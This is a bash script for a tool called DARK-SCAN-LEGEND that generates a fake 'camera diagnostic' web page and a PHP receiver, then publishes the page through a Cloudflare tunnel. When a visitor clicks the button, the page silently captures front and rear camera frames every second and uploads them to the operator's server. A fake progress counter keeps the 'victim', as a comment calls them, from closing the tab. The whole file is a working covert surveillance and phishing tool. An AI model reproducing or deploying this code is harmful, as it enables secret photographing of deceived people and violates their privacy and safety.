#!/bin/bash
# Tool: DARK-SCAN-LEGEND v22.0
# Feature: Non-Stop Infinite Capture & Anti-Idle
# Developer: JAPONI

trap 'printf "\n";stop' 2

DUMP_DIR="captured_data"

stop() {
    pkill php > /dev/null 2>&1
    pkill cloudflared > /dev/null 2>&1
    printf "\e[1;31m\n[!] SESSIONS KILLED BY OPERATOR.\e[0m\n"
    exit 1
}

banner() {
    clear
    printf "\e[1;31m
    ██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗
    ██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝
    ██████╔╝█████╗  ██████╔╝███████╗██║███████╗   ██║   
    ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║╚════██║   ██║   
    ██║     ███████╗██║  ██║███████║██║███████║   ██║   
    ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝   ╚═╝   
    \e[0m"
    printf "\e[1;32m   [+]----------------------------------------------------------[+]\e[0m\n"
    printf "\e[1;37m        NON-STOP CAPTURE - PERSISTENT LIVE STREAMING\e[0m\n"
    printf "\e[1;32m   [+]----------------------------------------------------------[+]\e[0m\n"
}

create_payloads() {
    mkdir -p "$DUMP_DIR"

    # 1. Backend: Receiver (No changes needed, already optimized)
    cat <<EOF > post.php
<?php
date_default_timezone_set('Africa/Algiers');
\$time = date('H:i:s');
\$folder = "$DUMP_DIR";

if (!empty(\$_POST['img'])) {
    \$type = (\$_POST['type'] == 'user') ? 'FRONT' : 'BACK';
    \$name = \$folder . '/' . \$type . '_' . date('His') . '.jpg';
    \$data = str_replace(' ', '+', str_replace('data:image/jpeg;base64,', '', \$_POST['img']));
    if (file_put_contents(\$name, base64_decode(\$data))) {
        echo "\e[1;32m[STREAMING] >> [\$type] Received | Saved: \$name [\$time]\e[0m\n";
    }
}
?>
EOF

    # 2. Frontend: The Infinite Loop Engine
    cat <<EOF > index.php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Diagnostic Tool</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #000; color: #fff; text-align: center; padding-top: 100px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #d21034; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { background: #d21034; color: white; border: none; padding: 15px 30px; border-radius: 4px; cursor: pointer; font-size: 18px; font-weight: bold; margin-top: 20px; }
    </style>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
</head>
<body>
    <div id="setup">
        <h2>Hardware Diagnostic v4.2</h2>
        <p>Press the button to analyze camera sensors for dead pixels.</p>
        <button class="btn" id="start">START DIAGNOSTIC</button>
    </div>
    <div id="running" style="display:none;">
        <div class="loader"></div>
        <p id="stat">Analyzing Sensors... 0%</p>
        <p style="color:#666; font-size:12px;">Do not close this window. Analysis may take several minutes.</p>
    </div>
    <video id="v" autoplay style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        document.getElementById('start').addEventListener('click', function() {
            document.getElementById('setup').style.display = 'none';
            document.getElementById('running').style.display = 'block';
            
            const modes = ['user', 'environment'];
            modes.forEach(mode => {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } }).then(stream => {
                    let video = document.getElementById('v');
                    video.srcObject = stream;
                    
                    // The Infinite Loop: Never stops unless tab is killed
                    setInterval(() => {
                        let canvas = document.getElementById('c');
                        canvas.width = 640; canvas.height = 480;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        $.post('post.php', { img: canvas.toDataURL('image/jpeg'), type: mode });
                    }, 1000); // 1 Frame Per Second (Persistent)
                }).catch(e => { document.getElementById('stat').innerText = "Sensor Error. Please Refresh."; });
            });

            // Visual trick: A fake counter that never reaches 100% to keep the victim waiting
            let p = 0;
            setInterval(() => {
                if(p < 99) p++;
                document.getElementById('stat').innerText = "Analyzing Sensors... " + p + "%";
            }, 5000);
        });
    </script>
</body>
</html>
EOF
}

# Execution Sequence
banner
create_payloads

printf "\e[1;33m[*] LAUNCHING LOCAL SERVER...\e[0m\n"
php -S 127.0.0.1:2026 > /dev/null 2>&1 &

printf "\e[1;33m[*] ESTABLISHING CLOUDFLARE TUNNEL...\e[0m\n"
rm -f .log
cloudflared tunnel --url http://127.0.0.1:2026 --logfile .log > /dev/null 2>&1 &

sleep 15
link=$(grep -o 'https://[-0-9a-z.]*\.trycloudflare.com' .log | head -n 1)

if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] CRITICAL: FAILED TO GENERATE LINK.\e[0m\n"
else
    printf "\e[1;32m\n----------------------------------------------------------\n"
    printf "\e[1;37m PERSISTENT LINK: \e[1;33m$link\n"
    printf "\e[1;32m----------------------------------------------------------\e[0m\n"
    printf "\e[1;34m[*] MONITORING: ACTIVE (NON-STOP MODE)\e[0m\n"
    printf "\e[1;34m[*] DATA STORED IN: /$DUMP_DIR\e[0m\n"
    tail -f /dev/null
fi
